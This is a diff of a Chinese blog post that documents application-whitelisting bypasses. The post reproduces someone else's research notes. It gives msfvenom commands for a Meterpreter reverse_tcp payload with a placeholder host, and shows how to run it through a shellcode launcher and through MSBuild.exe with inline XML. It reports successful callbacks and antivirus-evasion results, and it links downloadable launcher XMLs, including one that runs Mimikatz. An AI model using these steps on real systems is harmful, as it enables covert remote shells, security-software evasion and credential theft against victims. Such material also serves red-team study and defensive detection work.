@@ -109,7 +109,13 @@
 <meta property="og:image" content="http://8fa94.github.io/img/executepayload_4.png">
 <meta property="og:image" content="http://8fa94.github.io/img/executepayload_5.png">
 <meta property="og:image" content="http://8fa94.github.io/img/executepayload_6.png">
-<meta property="og:updated_time" content="2019-03-20T14:50:01.823Z">
+<meta property="og:image" content="http://8fa94.github.io/img/executepayload_7.png">
+<meta property="og:image" content="http://8fa94.github.io/img/executepayload_8.png">
+<meta property="og:image" content="http://8fa94.github.io/img/executepayload_9.png">
+<meta property="og:image" content="http://8fa94.github.io/img/executepayload_10.png">
+<meta property="og:image" content="http://8fa94.github.io/img/executepayload_11.png">
+<meta property="og:image" content="http://8fa94.github.io/img/executepayload_12.png">
+<meta property="og:updated_time" content="2019-03-21T03:48:59.474Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="基于白名单执行PayLoad复现(持续更新~)">
 <meta name="twitter:description" content="多喝热水">
@@ -376,12 +382,24 @@
                 
               
 
-              <time title="Created: 2019-03-20 21:56:02 / Modified: 22:50:01" itemprop="dateCreated datePublished" datetime="2019-03-20T21:56:02+08:00">2019-03-20</time>
+              <time title="Created: 2019-03-20 21:56:02" itemprop="dateCreated datePublished" datetime="2019-03-20T21:56:02+08:00">2019-03-20</time>
             
 
             
               
 
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Edited on</span>
+                
+                <time title="Modified: 2019-03-21 11:48:59" itemprop="dateModified" datetime="2019-03-21T11:48:59+08:00">2019-03-21</time>
               
             
           </span>
@@ -416,13 +434,21 @@
 
       
         <p>多喝热水 <a id="more"></a><br><strong>最近亮神的文章很火,看看文章,做做笔记!</strong></p>
-<h1 id="更新进度"><a href="#更新进度" class="headerlink" title="更新进度"></a>更新进度</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">- [✔] ShellCode执行盒</span><br><span class="line">- [*] MSbuild</span><br><span class="line">- [ ] Installutil</span><br><span class="line">- [ ] Regasm</span><br><span class="line">- [ ] Regsvcs</span><br><span class="line">- [ ] Mshta</span><br><span class="line">- [ ] Compiler</span><br><span class="line">- [ ] Csc</span><br><span class="line">- [ ] Msiexec</span><br><span class="line">- [ ] Regsvr32</span><br><span class="line">- [ ] Wmic</span><br><span class="line">- [ ] Odbcconf</span><br><span class="line">- [ ] PsExec</span><br><span class="line">- [ ] Forfiles</span><br><span class="line">- [ ] Pcalua</span><br><span class="line">- [ ] Msiexec</span><br><span class="line">- [ ] Cmstp</span><br><span class="line">- [ ] Ftp</span><br><span class="line">- [ ] Url.dll</span><br><span class="line">- [ ] zipfldr.dll</span><br></pre></td></tr></table></figure>
-<h1 id="基于ShellCode执行盒的绕过执行Payload"><a href="#基于ShellCode执行盒的绕过执行Payload" class="headerlink" title="基于ShellCode执行盒的绕过执行Payload"></a>基于ShellCode执行盒的绕过执行Payload</h1><h2 id="生成payload"><a href="#生成payload" class="headerlink" title="生成payload"></a>生成payload</h2><p><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=x.x.x.x lport=xxxx -e x86/shikata_ga_nai -i 5 -f raw &gt; ~/bin</code><br><img src="/img/executepayload.png" alt="executepayload"></p>
-<h2 id="github上开源的ShellCode执行盒"><a href="#github上开源的ShellCode执行盒" class="headerlink" title="github上开源的ShellCode执行盒"></a>github上开源的ShellCode执行盒</h2><p><a href="https://github.com/clinicallyinane/shellcode_launcher/" target="_blank" rel="noopener">https://github.com/clinicallyinane/shellcode_launcher/</a></p>
-<h2 id="执行payload"><a href="#执行payload" class="headerlink" title="执行payload"></a>执行payload</h2><p><img src="/img/executepayload_2.png" alt="executepayload_2"><br><strong>成功上线!</strong><br><img src="/img/executepayload_3.png" alt="executepayload_3"></p>
-<h2 id="自己也尝试写了一个ShellCode执行盒"><a href="#自己也尝试写了一个ShellCode执行盒" class="headerlink" title="自己也尝试写了一个ShellCode执行盒"></a>自己也尝试写了一个ShellCode执行盒</h2><p><del>(跟着视频写出来的,只改动了一点点</del><br><img src="/img/executepayload_4.png" alt="executepayload_4"><br><img src="/img/executepayload_5.png" alt="executepayload_5"><br><strong>同样成功上线!</strong></p>
-<h2 id="杀毒结果"><a href="#杀毒结果" class="headerlink" title="杀毒结果"></a>杀毒结果</h2><p><img src="/img/executepayload_6.png" alt="executepayload_6"></p>
-<h1 id="基于MSbuild-exe的绕过执行Payload"><a href="#基于MSbuild-exe的绕过执行Payload" class="headerlink" title="基于MSbuild.exe的绕过执行Payload"></a>基于MSbuild.exe的绕过执行Payload</h1>
+<h1 id="更新进度"><a href="#更新进度" class="headerlink" title="更新进度"></a>更新进度</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">- [✔] ShellCode执行盒</span><br><span class="line">- [✔] MSbuild</span><br><span class="line">- [ ] Installutil</span><br><span class="line">- [ ] Regasm</span><br><span class="line">- [ ] Regsvcs</span><br><span class="line">- [ ] Mshta</span><br><span class="line">- [ ] Compiler</span><br><span class="line">- [ ] Csc</span><br><span class="line">- [ ] Msiexec</span><br><span class="line">- [ ] Regsvr32</span><br><span class="line">- [ ] Wmic</span><br><span class="line">- [ ] Odbcconf</span><br><span class="line">- [ ] PsExec</span><br><span class="line">- [ ] Forfiles</span><br><span class="line">- [ ] Pcalua</span><br><span class="line">- [ ] Msiexec</span><br><span class="line">- [ ] Cmstp</span><br><span class="line">- [ ] Ftp</span><br><span class="line">- [ ] Url.dll</span><br><span class="line">- [ ] zipfldr.dll</span><br></pre></td></tr></table></figure>
+<h1 id="基于ShellCode执行盒的绕过执行Payload"><a href="#基于ShellCode执行盒的绕过执行Payload" class="headerlink" title="基于ShellCode执行盒的绕过执行Payload"></a>基于ShellCode执行盒的绕过执行Payload</h1><h2 id="0x00-生成payload"><a href="#0x00-生成payload" class="headerlink" title="0x00:生成payload"></a>0x00:生成payload</h2><p><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=x.x.x.x lport=xxxx -e x86/shikata_ga_nai -i 5 -f raw &gt; ~/bin</code><img src="/img/executepayload.png" alt="executepayload"></p>
+<h2 id="0x01-github上开源的ShellCode执行盒"><a href="#0x01-github上开源的ShellCode执行盒" class="headerlink" title="0x01:github上开源的ShellCode执行盒"></a>0x01:github上开源的ShellCode执行盒</h2><p><a href="https://github.com/clinicallyinane/shellcode_launcher/" target="_blank" rel="noopener">ShellCode执行盒</a></p>
+<h2 id="0x02-执行payload"><a href="#0x02-执行payload" class="headerlink" title="0x02:执行payload"></a>0x02:执行payload</h2><p><img src="/img/executepayload_2.png" alt="executepayload_2"><br>  <strong>成功上线!</strong><br><img src="/img/executepayload_3.png" alt="executepayload_3"></p>
+<h2 id="0x03-自己也尝试写了一个ShellCode执行盒"><a href="#0x03-自己也尝试写了一个ShellCode执行盒" class="headerlink" title="0x03:自己也尝试写了一个ShellCode执行盒"></a>0x03:自己也尝试写了一个ShellCode执行盒</h2><p><del>(跟着视频写出来的,只改动了一点点</del><br><img src="/img/executepayload_4.png" alt="executepayload_4"><img src="/img/executepayload_5.png" alt="executepayload_5"><br>  <strong>同样成功上线!</strong></p>
+<h2 id="0x04-杀毒结果"><a href="#0x04-杀毒结果" class="headerlink" title="0x04:杀毒结果"></a>0x04:杀毒结果</h2><p><img src="/img/executepayload_6.png" alt="executepayload_6"></p>
+<h1 id="基于MSbuild-exe的绕过执行Payload"><a href="#基于MSbuild-exe的绕过执行Payload" class="headerlink" title="基于MSbuild.exe的绕过执行Payload"></a>基于MSbuild.exe的绕过执行Payload</h1><h2 id="0x00-生成payload-1"><a href="#0x00-生成payload-1" class="headerlink" title="0x00:生成payload"></a>0x00:生成payload</h2><p><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=x.x.x.x lport=xxxx -f csharp</code><br><img src="/img/executepayload_7.png" alt="executepayload_7"><br>  需要注意的是三个箭头的部分 生成C#(C Sharp)的payload.</p>
+<h2 id="0x01-将ShellCode放入Xml文件中"><a href="#0x01-将ShellCode放入Xml文件中" class="headerlink" title="0x01:将ShellCode放入Xml文件中"></a>0x01:将ShellCode放入Xml文件中</h2><p>  把上述ShellCode放在XML文件中,XML在<a href="https://raw.githubusercontent.com/8fa94/8fa94.github.io/master/2019/03/20/Execute_ShellCode.xml" target="_blank" rel="noopener">这里下载</a>.<br>   <strong>注意:</strong>将红色两部分替换成与上面payload一致即可.<br>  <img src="/img/executepayload_8.png" alt="executepayload_8"></p>
+<h2 id="0x02-执行payload-1"><a href="#0x02-执行payload-1" class="headerlink" title="0x02:执行payload"></a>0x02:执行payload</h2><p>  MSbuild.exe系统默认安装路径为:<br> <code>C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll</code><br> 不同的系统可能有不同的区别,当路径不是默认路径的时候,修改XML的内容即可.<br><img src="/img/executepayload_9.png" alt="executepayload_9"><br><img src="/img/executepayload_10.png" alt="executepayload_10"><br><strong>成功上线!</strong><br><img src="/img/executepayload_11.png" alt="executepayload_11"></p>
+<h2 id="0x04-杀毒结果-1"><a href="#0x04-杀毒结果-1" class="headerlink" title="0x04:杀毒结果"></a>0x04:杀毒结果</h2><p><img src="/img/executepayload_12.png" alt="executepayload_12"><br>  看来公开之后免杀效果不是那么显著了.</p>
+<h2 id="0x05-拓展使用"><a href="#0x05-拓展使用" class="headerlink" title="0x05:拓展使用"></a>0x05:拓展使用</h2><p>  -可以把.XML后缀改为.csproj,用法是一样的.<br>  -上面是基于32位系统的XML,64位的在<a href="https://raw.githubusercontent.com/8fa94/8fa94.github.io/master/2019/03/20/Execute_x64_ShellCode.xml" target="_blank" rel="noopener">这里下载</a>.<br>  -可以拿MSbuild来执行MIMIkatz,<a href="https://raw.githubusercontent.com/8fa94/8fa94.github.io/master/2019/03/20/Execute_mimikatz.xml" target="_blank" rel="noopener">XML下载</a>.(2.0版本需要64位系统.</p>
+<h2 id="0x06-参考资料"><a href="#0x06-参考资料" class="headerlink" title="0x06:参考资料"></a>0x06:参考资料</h2><blockquote>
+<p><a href="https://3gstudent.github.io/3gstudent.github.io/Use-MSBuild-To-Do-More/" target="_blank" rel="noopener">https://3gstudent.github.io/3gstudent.github.io/Use-MSBuild-To-Do-More/</a><br><a href="https://blog.conscioushacker.io/index.php/2017/11/17/application-whitelisting-bypass-msbuild-exe/" target="_blank" rel="noopener">https://blog.conscioushacker.io/index.php/2017/11/17/application-whitelisting-bypass-msbuild-exe/</a></p>
+</blockquote>
+
       
     </div>
 
@@ -599,7 +625,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#更新进度"><span class="nav-number">1.</span> <span class="nav-text">更新进度</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#基于ShellCode执行盒的绕过执行Payload"><span class="nav-number">2.</span> <span class="nav-text">基于ShellCode执行盒的绕过执行Payload</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#生成payload"><span class="nav-number">2.1.</span> <span class="nav-text">生成payload</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#github上开源的ShellCode执行盒"><span class="nav-number">2.2.</span> <span class="nav-text">github上开源的ShellCode执行盒</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#执行payload"><span class="nav-number">2.3.</span> <span class="nav-text">执行payload</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#自己也尝试写了一个ShellCode执行盒"><span class="nav-number">2.4.</span> <span class="nav-text">自己也尝试写了一个ShellCode执行盒</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#杀毒结果"><span class="nav-number">2.5.</span> <span class="nav-text">杀毒结果</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#基于MSbuild-exe的绕过执行Payload"><span class="nav-number">3.</span> <span class="nav-text">基于MSbuild.exe的绕过执行Payload</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#更新进度"><span class="nav-number">1.</span> <span class="nav-text">更新进度</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#基于ShellCode执行盒的绕过执行Payload"><span class="nav-number">2.</span> <span class="nav-text">基于ShellCode执行盒的绕过执行Payload</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-生成payload"><span class="nav-number">2.1.</span> <span class="nav-text">0x00:生成payload</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-github上开源的ShellCode执行盒"><span class="nav-number">2.2.</span> <span class="nav-text">0x01:github上开源的ShellCode执行盒</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-执行payload"><span class="nav-number">2.3.</span> <span class="nav-text">0x02:执行payload</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-自己也尝试写了一个ShellCode执行盒"><span class="nav-number">2.4.</span> <span class="nav-text">0x03:自己也尝试写了一个ShellCode执行盒</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-杀毒结果"><span class="nav-number">2.5.</span> <span class="nav-text">0x04:杀毒结果</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#基于MSbuild-exe的绕过执行Payload"><span class="nav-number">3.</span> <span class="nav-text">基于MSbuild.exe的绕过执行Payload</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-生成payload-1"><span class="nav-number">3.1.</span> <span class="nav-text">0x00:生成payload</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-将ShellCode放入Xml文件中"><span class="nav-number">3.2.</span> <span class="nav-text">0x01:将ShellCode放入Xml文件中</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-执行payload-1"><span class="nav-number">3.3.</span> <span class="nav-text">0x02:执行payload</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-杀毒结果-1"><span class="nav-number">3.4.</span> <span class="nav-text">0x04:杀毒结果</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-拓展使用"><span class="nav-number">3.5.</span> <span class="nav-text">0x05:拓展使用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-参考资料"><span class="nav-number">3.6.</span> <span class="nav-text">0x06:参考资料</span></a></li></ol></li></ol></div>
             
 
           </div>
